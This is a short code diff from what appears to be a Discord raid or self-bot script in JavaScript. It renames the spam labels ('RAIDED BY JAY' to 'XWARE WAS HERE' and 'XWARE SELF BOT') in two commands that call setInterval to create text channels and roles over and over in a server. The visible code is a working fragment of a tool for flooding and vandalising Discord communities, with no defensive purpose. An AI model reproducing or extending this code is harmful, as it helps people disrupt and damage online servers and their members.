@@ -59,7 +59,7 @@ bot.on("message", message => {
         }
         if(cmd === "createchannels") {
             setInterval(() => {
-                message.guild.createChannel("RAIDED BY JAY", {
+                message.guild.createChannel("XWARE WAS HERE", {
                 type: "text"
                 })
                 })
@@ -67,7 +67,7 @@ bot.on("message", message => {
         if(cmd === "createroles") {
             setInterval(() => {
                 message.guild.createRole({
-                    name:" RAIDED BY JAY",
+                    name:"XWARE SELF BOT",
                     color: "RANDOM"
                 })
                 })
